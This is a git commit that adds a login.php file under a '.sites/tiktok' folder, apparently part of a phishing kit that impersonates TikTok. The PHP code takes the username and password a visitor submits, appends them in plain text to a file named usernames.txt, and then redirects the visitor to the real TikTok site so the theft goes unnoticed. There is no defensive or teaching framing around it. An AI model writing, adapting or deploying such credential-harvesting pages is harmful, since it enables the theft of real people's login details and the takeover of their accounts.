cc732d91cb8f177e28a227dfe4c66cd1abe14077
axom tools <adamowaissi055@gmail.com>
2026-06-13 12:15:59 +0300

    Create login.php

---
+++ .sites/tiktok/login.php
@@ -0,0 +1,7 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
+    file_put_contents("usernames.txt", $data, FILE_APPEND);
+    header("Location: https://www.tiktok.com");
+}
+?>
